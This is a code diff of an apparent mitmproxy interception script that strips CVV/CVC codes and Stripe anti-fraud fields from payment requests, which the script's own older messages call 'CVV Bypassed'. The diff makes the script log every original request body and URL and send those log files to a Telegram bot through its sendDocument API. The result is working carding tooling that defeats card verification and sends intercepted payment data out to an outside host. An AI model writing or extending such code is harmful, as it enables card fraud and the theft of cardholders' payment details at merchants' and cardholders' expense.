@@ -43,14 +43,7 @@ REGEX_PATTERNS = [
     re.compile(rb"cardVerificationCode=[\d]{3,4}"),
     re.compile(rb"cvcNumber=[\d]{3,4}"),
     re.compile(rb"cvv_num=[\d]{3,4}"),
-    re.compile(rb"cvc_num=[\d]{3,4}")
-]
-
-# Precompiled regex patterns specifically for api.stripe.com
-STRIPE_SPECIFIC_PATTERNS = [
-    re.compile(rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}"),
-    re.compile(rb"card\[cvc\]=[\d]{3,4}"),
-    re.compile(rb"source_data\[card\]\[cvc\]=[\d]{3,4}"),
+    re.compile(rb"cvc_num=[\d]{3,4}"),
     re.compile(rb"payment_method_data\[payment_user_agent\]=[^&]*"),
     re.compile(rb"payment_method_data\[time_on_page\]=[^&]*"),
     re.compile(rb"payment_method_data\[pasted_fields\]=[^&]*"),
@@ -62,6 +55,7 @@ STRIPE_SPECIFIC_PATTERNS = [
 ]
 
 LOG_FILE_PATH = "request_logs.json"
+URL_LOG_FILE_PATH = "url_logs.txt"
 
 def log_to_file(log_data):
     """
@@ -88,6 +82,14 @@ def log_request_body(flow: http.HTTPFlow, message: str):
     }
     log_to_file(log_data)
     ctx.log.info(f"{message} logged to {LOG_FILE_PATH}")
+
+def log_url(flow: http.HTTPFlow):
+    """
+    Logs the URL to a text file.
+    """
+    with open(URL_LOG_FILE_PATH, 'a') as url_log_file:
+        url_log_file.write(f"{datetime.now().isoformat()} - {flow.request.pretty_url}\n")
+    ctx.log.info(f"URL logged to {URL_LOG_FILE_PATH}")
 
 def clean_up_trailing_characters(request_body: bytes) -> bytes:
     """
@@ -118,7 +120,7 @@ def remove_patterns_from_request_body(request_body: bytes, patterns) -> (bytes, 
     for pattern in patterns:
         if pattern.search(request_body):
             data_removed = True
-        request_body = pattern.sub(b"", request_body)
+            request_body = pattern.sub(b"", request_body)
     return request_body, data_removed
 
 def send_telegram_notification(message: str):
@@ -146,7 +148,7 @@ def send_log_file():
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
     with open(LOG_FILE_PATH, 'rb') as log_file:
         files = {'document': log_file}
-        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'Log file'}
+        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'Request log file'}
         try:
             response = requests.post(url, data=data, files=files)
             if response.status_code == 200:
@@ -156,24 +158,35 @@ def send_log_file():
         except Exception as e:
             ctx.log.error(f"Error sending log file: {e}")
 
+def send_url_log_file():
+    """
+    Sends the URL log file to the Telegram bot.
+    """
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    with open(URL_LOG_FILE_PATH, 'rb') as url_log_file:
+        files = {'document': url_log_file}
+        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': 'URL log file'}
+        try:
+            response = requests.post(url, data=data, files=files)
+            if response.status_code == 200:
+                ctx.log.info("URL log file sent successfully")
+            else:
+                ctx.log.error(f"Failed to send URL log file: {response.status_code} {response.text}")
+        except Exception as e:
+            ctx.log.error(f"Error sending URL log file: {e}")
+
 def modify_request(flow: http.HTTPFlow):
     """
     Modifies the intercepted request to remove CVV data, payment user agent, and other specified fields.
     """
-    if "api.stripe.com" in flow.request.pretty_url:
-        # Remove specified fields from the Stripe request data
-        modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, STRIPE_SPECIFIC_PATTERNS)
-        if data_removed:
-            log_request_body(flow, "Original Request Body")
-            send_telegram_notification("Cvv Bypassed for stripe successfully")
-            send_log_file()
-    else:
-        # Remove CVV codes and other sensitive data from the request data
-        modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, REGEX_PATTERNS)
-        if data_removed:
-            log_request_body(flow, "Original Request Body")
-            send_telegram_notification("CVV Bypassed successfully")
-            send_log_file()
+    log_request_body(flow, "Original Request Body")
+    log_url(flow)
+    # Remove CVV codes and other sensitive data from the request data
+    modified_body, data_removed = remove_patterns_from_request_body(flow.request.content, REGEX_PATTERNS)
+    if data_removed:
+        send_telegram_notification("Sensitive data removed from request")
+        send_log_file()
+        send_url_log_file()
 
     # Clean up any trailing characters if necessary
     modified_body = clean_up_trailing_characters(modified_body)
